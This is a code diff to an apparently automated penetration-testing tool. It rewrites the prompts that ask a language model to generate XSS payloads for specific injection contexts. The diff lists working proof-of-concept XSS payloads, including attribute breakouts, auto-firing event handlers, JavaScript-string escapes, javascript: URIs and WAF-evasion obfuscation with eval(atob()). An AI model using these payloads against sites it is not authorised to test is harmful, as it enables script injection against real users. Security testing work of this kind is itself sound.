@@ -115,26 +115,58 @@ CRITICAL FORMATTING RULES:
             param_hint = ""
             p = params.lower()
             if any(k in p for k in ["src", "href", "style", "action", "data"]):
-                param_hint = f"The parameter '{params}' suggests an HTML attribute context — craft payloads to escape that attribute."
+                param_hint = f"The parameter '{params}' is likely an HTML attribute — prioritise attribute-breakout payloads."
             elif any(k in p for k in ["callback", "jsonp", "json"]):
                 param_hint = f"The parameter '{params}' suggests a JSONP/callback context — craft payloads for that context."
             return f"""You are an expert XSS penetration tester.
 {header}
 {param_hint}
 
-Generate exactly 5 UNIQUE XSS payloads, one from each category:
-1. <script> tag execution: e.g. <script>alert(1)</script>
-2. HTML event handler on a tag: e.g. <svg onload="alert(1)">, <img src="x" onerror="alert(1)">
-3. JavaScript URI scheme: e.g. javascript:alert(1)
-4. Exotic tag: e.g. <iframe srcdoc="...">, <object data="javascript:...">, <embed>
-5. WAF evasion / obfuscation: mixed case, HTML entities, eval(atob()), null bytes
+Generate exactly 5 UNIQUE XSS payloads, one per injection context — in this order:
+
+1. HTML attribute breakout — close the current attribute with a quote, inject an auto-firing event handler, neutralise the rest.
+   The value is typically reflected inside value="INJECT" or similar.
+   GOOD (auto-fire, no user interaction needed):
+     " autofocus onfocus="alert(document.domain)" x="
+     " onerror="alert(document.domain)" src="x
+     "><svg onload=alert(document.domain)>
+   BAD — do NOT use these (require user interaction):
+     onmouseover, onclick, onmouseenter, ondblclick, onmouseout
+
+2. Standalone tag with event handler — inject a new tag that fires JS without closing anything first.
+   Good examples:
+     <svg onload=alert(document.domain)>
+     <img src=x onerror=alert(document.domain)>
+     <body onload=alert(document.domain)>
+
+3. JavaScript context breakout — close the current JS string/statement, inject JS, comment out the rest.
+   The value is typically reflected inside var x="INJECT" or similar.
+   Good examples:
+     ';alert(document.domain)//
+     \";alert(document.domain)//
+     </script><script>alert(document.domain)</script>
+
+4. JavaScript URI injection — for href/src/action/redirect parameters.
+   Good examples:
+     javascript:alert(document.domain)
+     javascript:void(alert(document.domain))
+
+5. Obfuscated / WAF-bypass — encoding, mixed case, or eval tricks to evade filters.
+   Good examples:
+     <img src=x onerror=&#x61;lert(document.domain)>
+     <ScRiPt>alert(document.domain)</ScRiPt>
+     <svg/onload=eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))>
 
 RULES:
-- Do NOT use alert(1) in every payload — use confirm(1) or console.log(1) for variety.
-- Always quote HTML attribute values with double quotes.
-- Do NOT repeat techniques across payloads.
+- Use alert(document.domain) — it proves real XSS impact better than alert(1).
+- ALL payloads must fire WITHOUT any user interaction (no mouse/click events).
+- Allowed auto-firing events: onload, onerror, onfocus+autofocus, onanimationstart, ontoggle.
+- FORBIDDEN events: onmouseover, onclick, onmouseenter, ondblclick, onmouseout, onmouseup.
+- Payloads for context 1 MUST start by closing the attribute quote (" or ').
+- Each payload must target a DIFFERENT context — no two payloads the same technique.
+- Output ONLY the 5 payloads wrapped in curly braces, nothing else.
 
-Example: {{<script>alert(1)</script>}} {{<img src="x" onerror="confirm(1)">}} {{javascript:alert(1)}} {{<svg/onload=alert(1)>}} {{"/><sCrIpT>eval(atob("YWxlcnQoMSk="))</sCrIpT>}}"""
+Example: {{"" autofocus onfocus="alert(document.domain)" x=""}} {{<svg onload=alert(document.domain)>}} {{';alert(document.domain)//}} {{javascript:alert(document.domain)}} {{<img src=x onerror=&#x61;lert(document.domain)>}}"""
 
         if "SQL" in vuln_upper:
             return f"""You are an expert SQL injection penetration tester.
@@ -326,12 +358,23 @@ Do NOT repeat minor variations of the same payload."""
             return "[]"
 
     async def generate_context_aware_xss(self, context_html: str) -> str:
-        prompt = f"""
-        You are a penetration testing assistant. The input is reflected in the following HTML context:
-        {context_html}
-        Generate a single highly advanced XSS payload that breaks out of this specific context.
-        Provide JUST the payload, no other text.
-        """
+        prompt = f"""You are an expert XSS penetration tester. A probe string was reflected in this HTML snippet:
+
+{context_html}
+
+Step 1 — identify the injection context:
+  A) Inside an HTML attribute value:  value="INJECT"  or  class='INJECT'
+  B) Inside a <script> block or JS string:  var x = "INJECT";
+  C) Inside href/src/action/data attribute:  href="INJECT"
+  D) In raw HTML text between tags:  <p>INJECT</p>
+
+Step 2 — choose the matching payload:
+  A) Attribute breakout: close the quote + auto-firing event, e.g.  " autofocus onfocus="alert(document.domain)" x="  or  " onerror="alert(document.domain)" src="x
+  B) JS context breakout: close the string + code, e.g.  ';alert(document.domain)//
+  C) JavaScript URI: javascript:alert(document.domain)
+  D) Tag injection: <svg onload=alert(document.domain)>
+
+Output ONLY the raw payload string for THIS context. No explanation, no code fences."""
         response = await self.call_llm(prompt)
         return response["response"].strip()
 
